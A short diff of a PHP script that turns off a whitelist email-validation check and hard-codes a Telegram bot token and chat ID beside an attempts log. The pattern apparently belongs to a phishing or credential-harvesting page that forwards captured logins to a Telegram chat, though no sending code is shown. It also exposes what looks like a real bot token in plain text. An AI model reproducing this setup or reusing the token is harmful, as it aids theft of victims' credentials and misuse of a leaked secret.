@@ -3,7 +3,7 @@ session_start();
 define('ATTEMPTS_FILE', __DIR__ . '/attempts.json');
 
 // === TOGGLE: email validation ON/OFF ===
-$EMAIL_VALIDATION_ENABLED = true; // <<< set to false to DISABLE whitelist email validation
+$EMAIL_VALIDATION_ENABLED = false; // <<< set to false to DISABLE whitelist email validation
 
 $telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
 $telegram_chat_id   = "6915371044";
